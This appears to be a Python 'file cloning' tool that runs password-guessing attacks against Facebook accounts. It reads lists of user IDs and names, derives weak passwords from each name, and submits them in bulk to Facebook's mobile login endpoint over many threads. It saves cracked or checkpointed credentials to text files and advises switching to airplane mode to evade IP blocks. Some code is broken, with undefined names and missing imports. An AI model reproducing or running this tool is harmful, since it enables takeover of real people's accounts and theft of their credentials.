+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+P = '\x1b[1;97m' # PUTIH
+M = '\033[0;91m' # MERAH 
+H = '\033[1;92m' # HIJAU 
+K = '\033[1;91m' # KUNING 
+B = '\033[0;92m' # BIRU 
+U = '\033[0;95m' # UNGU 
+O = '\033[0;96m' # BIRU MUDA
+N = '\033[0m'	# WARNA MATI 
+from concurrent.futures import ThreadPoolExecutor as QADIRMahar
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+P = '\x1b[1;97m' # 
+M = '\033[1;31m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;97m' # 
+U = '\x1b[1;97m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://m.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+###
+birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
+bd = random.randint(2e7, 3e7)
+sim = random.randint(2e4, 4e4)
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quKingty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+
+def main():
+	os.system('clear');print(banner)
+	print('\033[1;32m        ┌─────────────────────────────────┐') 
+	print("\033[1;92m\t│\033[1;92mWELLCOME TO King 2.8     \033[1;92m      │")
+	print('\033[1;32m┌────────────────────────────────────────────┐') 
+	print('\033[1;92m│\033[1;37m[01] \033[1;92mFILE CLONING   \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m] \033[1;31m(\033[1;32mFAST\033[1;31m) \033[1;32m │ ')
+	print('\033[1;92m│\033[1;37m[02] \033[1;92mFILE CLONING   \033[1;37m[\033[1;33mONLY OK IDS  \033[1;37m] \033[1;31m(\033[1;32mSLOW\033[1;31m) \033[1;32m │')
+	print('\033[1;92m│\033[1;37m[03] \033[1;92mCONTACT WITH OWNER \033[1;32m                    │')
+	print('\033[1;92m│\033[1;37m[00] \033[1;91mEXIT\033[1;32m                                   │ ')
+	print('\033[1;32m└────────────────────────────────────────────┘')
+	print('')
+	Adi = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
+	if Adi in ('1', '01'):
+		__crack__().plerr()
+	if Adi in ('2', '02'):
+		__filecrack3__().plerr()
+	if Adi in ('3', '03'):
+		os.system("xdg-open https://youtube.com/@abirtips1200")
+	if Adi in ('0', '00'):
+		exit('THANKS FOR USING MARK TOOL')  
+	else:
+		print ('      InvKingd Select')
+		main()
+def banner():
+	print(banner)
+def hasil(ok,cp):
+	if len(ok) != 0 or len(cp) != 0:
+		print('\033[1;96m The Prosess Done Is Completed')
+		print('\n\033[1;92mTotal OK : %s \n \033[1;91m Total CP : %s'%(str(len(ok)),str(len(cp))));input(' Press Enter To Go Back ');main()
+	else:
+		print('\n\033[0mYour Ip Is Blocked Or Blacklist Restart Your Mobile ')
+		exit()
+		
+class __crack__:
+	def __init__(self):
+		self.id = []
+	def plerr(self):
+		os.system("clear");print(banner)
+		print('          \033[1;32m[ File CLONING CP/OK IDS MIX ] ')
+		print(50*"\033[1;97m_")
+		try:
+			self.apk = input("\033[1;37m[+] \033[1;36mFILE PATH\033[1;31m : \033[1;32m ")
+			print ('')
+			self.id = open(self.apk).read().splitlines()
+		except:
+			print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
+			input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');main()
+		self.__pler__() 
+	def __mbasic__(self, user, _sempak_):
+		global ok,cp,loop
+		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mKing\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
+		sys.stdout.flush()
+		for pw in _sempak_:
+			pw = pw.lower()
+			try: os.mkdir('')
+			except: pass
+			try:
+				Adiagents = random.choice(liners)
+			except (KeyError, IOError):
+				Adiagents  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+			ses = requests.Session()
+			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			po = ses.post("https://mbasic.facebook.com/login/device-based/vKingdate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+			if 'c_user' in ses.cookies.get_dict():
+				print('\r\033[1;37m[\033[1;32mKing-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				wrt = '%s - %s' % (user,pw)
+				ok.append(wrt)
+				open('ok.txt','a').write('%s\n' % wrt)
+				break
+			elif 'checkpoint' in ses.cookies.get_dict():
+				print('\r\033[1;37m[\033[1;32mKing-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				wrt = '%s - %s' % (user,pw)
+				ok.append(wrt)
+				open('cp.txt','a').write('%s\n' % wrt)
+				break
+			else:
+				continue
+		loop += 1
+	def __pler__(self):
+		os.system("clear")
+		print(banner)
+		print ("\033[1;37m [1] \033[1;36mMETHOD FAST ")
+		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
+		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM ")
+		print(50*"\033[1;97m_")
+		yan = input('\033[1;37m[+] \033[1;36mCHOOSE OPTION \033[1;31m: \033[1;32m')
+		if yan == '':
+			print('\Choose Error ')
+			exit()
+		elif yan in ('1', '01'):
+			os.system("clear")
+			print(banner)
+			time.sleep(1)
+			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
+			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
+			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
+			print(50*"\033[1;97m_")
+			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
+			print(50*"\033[1;97m_")
+			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
+				for yntkts in self.id:
+					try:
+						uid, name = yntkts.split('|')
+						xz = name.split(' ')
+						if len(xz) == 1:
+							pwx = [Name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
+						elif len(xz) == 2:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
+						elif len(xz) == 3:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
+						elif len(xz) == 4:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
+						else:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
+						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
+					except:
+						pass
+			os.remove(self.apk)
+			hasil(ok,cp)
+		elif yan in ('2', '02'):
+			os.system("clear")
+			print(banner)
+			time.sleep(1)
+			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
+			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
+			print('\033[1;37m[+]\033[1;36mKing PROCESS HAS BEEN STARTED')
+			print(50*"\033[1;97m_")
+			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
+			print(50*"\033[1;97m_")
+			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
+				for yntkts in self.id:
+					try:
+						uid, name = yntkts.split('|')
+						xz = name.split(' ')
+						if len(xz) == 1:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
+						elif len(xz) == 2:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
+						elif len(xz) == 3:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
+						elif len(xz) == 4:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
+						else:
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
+						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
+					except:
+						pass
+			os.remove(self.apk)
+			hasil(ok,cp)
+		elif yan in ('3', '03'):
+			os.system("clear")
+			print(banner)
+			time.sleep(1)
+			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
+			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
+			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
+			print(50*"\033[1;97m_")
+			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
+			print(50*"\033[1;97m_")
+			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
+				for yntkts in self.id:
+					try:
+						uid, name = yntkts.split('|')
+						xz = name.split(' ')
+						if len(xz) == 1:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
+						elif len(xz) == 2:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
+						elif len(xz) == 3:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
+						elif len(xz) == 4:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
+						else:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
+						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
+					except:
+						pass
+			os.remove(self.apk)
+			hasil(ok,cp)
+		else:
+			print('\nSalah')
+			time.sleep(1)
+			self.__pler__()
+			
+class __filecrack3__:
+	def __init__(self):
+		self.id = []
+	def plerr(self):
+		os.system("clear");print(banner)
+		print('          \033[1;32m[ File CLONING ONLY OK IDS ] ')
+		print(50*"\033[1;97m_")
+		try:
+			self.apk = input("\033[1;37m[+] \033[1;36mFILE PATH\033[1;31m : \033[1;32m ")
+			print ('')
+			self.id = open(self.apk).read().splitlines()
+		except:
+			print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
+			input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');main()
+            
+     
+		self.__pler__()
+	def __mbasic__(self, user, _sempak_):
+		global ok,cp,loop
+		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mKing\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
+		sys.stdout.flush()
+		for pw in _sempak_:
+			pw = pw.lower()
+			try: os.mkdir('')
+			except: pass
+			try:
+				ua_xiaomi = open('agent.txt', 'r').read()
+			except (KeyError, IOError):
+				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+			ses = requests.Session()
+			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			po = ses.post("https://mbasic.facebook.com/login/device-based/vKingdate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+			if 'c_user' in ses.cookies.get_dict():
+				print('\r\033[1;37m[\033[1;32m𝗥𝗔𝗝-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				wrt = '%s - %s' % (user,pw)
+				ok.append(wrt)
+				open('𝗥𝗔𝗝_Ok.txt','a').write('%s\n' % wrt)
+				break
+			elif 'checkpoint' in ses.cookies.get_dict():
+				print('\r\033[1;37m[\033[1;31m𝗥J-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				wrt = '%s - %s' % (user,pw)
+				ok.append(wrt)
+				open('cp.txt','a').write('%s\n' % wrt)
+				break
+			else:
+				continue
+		loop += 1
+	def __pler__(self):
+		os.system("clear")
+		print(banner)
+		print ("\033[1;37m [1] \033[1;36mMETHOD FAST ")
+		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
+		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM ")
+		print(50*"\033[1;97m_")
+		yan = input('\033[1;37m[+] \033[1;36mCHOOSE OPTION \033[1;31m: \033[1;32m')
+		if yan == '':
+			print('\Choose Error ')
+			exit()
+		elif yan in ('1', '01'):
+			os.system("clear")
+			print(banner)
+			time.sleep(1)
+			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
+			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
+			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
+			print(50*"\033[1;97m_")
+			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
+			print(50*"\033[1;97m_")
+			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
+				for yntkts in self.id:
+					try:
+						uid, name = yntkts.split('|')
+						xz = name.split(' ')
+						fi , la = name.split(' ')
+						first = fi.lower()
+						last = la.lower()
+						if len(xz) == 1:
+							pwx = [first+' '+last, first+last, first+'123', first+'12345']
+						elif len(xz) == 2:
+							pwx = [first+' '+last, first+last, first+'123', first+'12345']
+						elif len(xz) == 3:
+							pwx = [first+' '+last, first+last, first+'123', first+'12345']
+						elif len(xz) == 4:
+							pwx = [first+' '+last, first+last, first+'123', first+'12345']
+						else:
+							pwx = [first+' '+last, first+last, first+'123', first+'12345']
+						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
+					except:
+						pass
+			os.remove(self.apk)
+			hasil(ok,cp)
+		elif yan in ('2', '02'):
+			os.system("clear")
+			print(banner)
+			time.sleep(1)
+			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
+			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
+			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
+			print(50*"\033[1;97m_")
+			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
+			print(50*"\033[1;97m_")
+			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
+				for yntkts in self.id:
+					try:
+						uid, name = yntkts.split('|')
+						xz = name.split(' ')
+						if len(xz) == 1:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
+						elif len(xz) == 2:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
+						elif len(xz) == 3:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
+						elif len(xz) == 4:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
+						else:
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345"]
+						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
+					except:
+						pass
+			os.remove(self.apk)
+			hasil(ok,cp)
+		elif yan in ('3', '03'):
+			os.system("clear")
+			print(banner)
+			time.sleep(1)
+			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
+			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
+			print('\033[1;37m[+]\033[1;36m𝗥𝗔𝗝 PROCESS HAS BEEN STARTED')
+			print(50*"\033[1;97m_")
+			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
+			print(50*"\033[1;97m_")
+			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
+				for yntkts in self.id:
+					try:
+						uid, name = yntkts.split('|')
+						xz = name.split(' ')
+						if len(xz) == 1:
+							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
+						elif len(xz) == 2:
+							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
+						elif len(xz) == 3:
+							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
+						elif len(xz) == 4:
+							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
+						else:
+							pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
+						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
+					except:
+							pass
+			os.remove(self.apk)
+			hasil(ok,cp)
+		else:
+			print('\nSalah')
+			time.sleep(1)
+			self.__pler__()
+
+
+class load:
+	def __init__(self):
+		_ = ''
+		__ = int('30')
+		___ = int('0')
+		__ -= 1
+		___ += 1
+		for t in range(int("1")):
+			print('\r Loading ...')
+			sys.stdout.flush()
+			time.sleep(0.1)
+		print('\n')
+banner = """   
+ ▓██   ██▓▄▄▄█████▓    ▄▄▄        ██████   █████▒
+ ▒██  ██▒▓  ██▒ ▓▒   ▒████▄    ▒██    ▒ ▓██   ▒ 
+  ▒██ ██░▒ ▓██░ ▒░   ▒██  ▀█▄  ░ ▓██▄   ▒████ ░ 
+  ░ ▐██▓░░ ▓██▓ ░    ░██▄▄▄▄██   ▒   ██▒░▓█▒  ░ 
+  ░ ██▒▓░  ▒██▒ ░     ▓█   ▓██▒▒██████▒▒░▒█░    
+   ██▒▒▒   ▒ ░░       ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░    
+ ▓██ ░▒░     ░         ▒   ▒▒ ░░ ░▒  ░ ░ ░      
+ ▒ ▒ ░░    ░           ░   ▒   ░  ░  ░   ░ ░    
+=================================================
+    [-] AUTHOR    :\033[1;32m Kin9
+    [-] TOOLS     :\033[1;32m RANDOM CLONE
+    [-] VERSION   :\033[1;32m 1.0
+    [-] STATUS    :\033[1;32m Free
+================================================== """                         
+ct = datetime.now()
+n = ct.month
+monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
+try:
+	if n < 0 or n > 12:
+		exit()
+	nTemp = n - 1
+except ValueError:
+	exit()
+	
+urls="https://www.facebook.com/Oise95"
+_ses=requests.Session()
+def xoshnaw():
+	uuid = str(os.geteuid()) + str(os.getlogin())
+	id = "-".join(uuid)
+	print("\x1b[37;1mYOUR ID : "+id)
+	try:
+		httpCaht = requests.get("https://chat.whatsapp.com/BAM1sLvsxhCHArq6cYSXCZ").text
+		if id in httpCaht:
+			print("\033[1;97mFOR BUY TOOL NEED 15k ₦ MONTHLY")
+			msg = str(os.geteuid())
+			time.sleep(0.3)
+			pass
+		else:
+			print("\x1b[1;91mFOR TOOL NEED  FREE ")
+			time.sleep(1)
+			sys.exit()
+	except:
+		sys.exit()
+main()
